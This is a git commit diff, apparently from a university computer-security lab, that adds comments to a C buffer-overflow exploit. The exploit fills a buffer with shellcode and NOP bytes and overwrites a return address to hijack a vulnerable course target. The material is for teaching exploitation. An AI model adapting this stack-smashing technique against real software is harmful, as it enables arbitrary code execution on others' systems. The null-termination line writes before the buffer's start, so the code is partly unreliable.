e12e772e667c5d985bb9cc28fe2cbff76edcdc03
Weizhou  Wang <wangw222@remote.ecf.utoronto.ca>
2022-10-04 18:00:20 -0400

    Improved coding style

--- ece568-lab1-2022f/sploits/sploit3.c
+++ ece568-lab1-2022f/sploits/sploit3.c
@@ -5,8 +5,8 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target3"
-#define BUFF_ADDR 0x40a4fe40
-#define ATTACK_SIZE 81 // 88(distance from return to buffer) - 67(size of buffer) + 8(size of return) + 1
+#define BUFF_ADDR 0x40a4fe40 // [0][4][e][f][4][a][0][4][00000000] on memory(little endian), so only need to overwrite the first 4 bytes
+#define ATTACK_SIZE 81 // 88(distance from return to buffer) - 12(length of original buffer)) + 4(BUFF_ADDR) + 1
 
 int
 main ( int argc, char * argv[] )
@@ -14,26 +14,21 @@ main ( int argc, char * argv[] )
     char *    args[3];
     char *    env[1];
 
-    // Copy the shell code into a env buffer, name it EGG as in the paper
-    // char *env_buffer = (char*)malloc(strlen(shellcode)+5);
-    // memcpy(env_buffer, "EGG=", 4);
-    // int i;
-    // for (i = 0; i < strlen(shellcode); ++i) {
-    //     env_buffer[i+4] = shellcode[i];
-    // }
-    // shellcode[-1] = '\0';
-
-    // Write the attack buffer, fill with NOP and address of env variables
+    // Declare the attack buffer
     char *attack_buffer = (char*)malloc(ATTACK_SIZE);
     int i;
+    // Overwrite the front with shellcode
     for (i = 0; i < strlen(shellcode); ++i) {
         attack_buffer[i] = shellcode[i];
     }
+    // Overwrite the rest until return address by NOP
     for (; i < ATTACK_SIZE-5; ++i) {
         attack_buffer[i] = 0x90;
     }
+    // Overwrite the return address
     int *ptr = (int*)(attack_buffer+i);
     *ptr = BUFF_ADDR;
+    // Add NULL terminating
     attack_buffer[-1] = '\0';
 
     args[0] = TARGET;
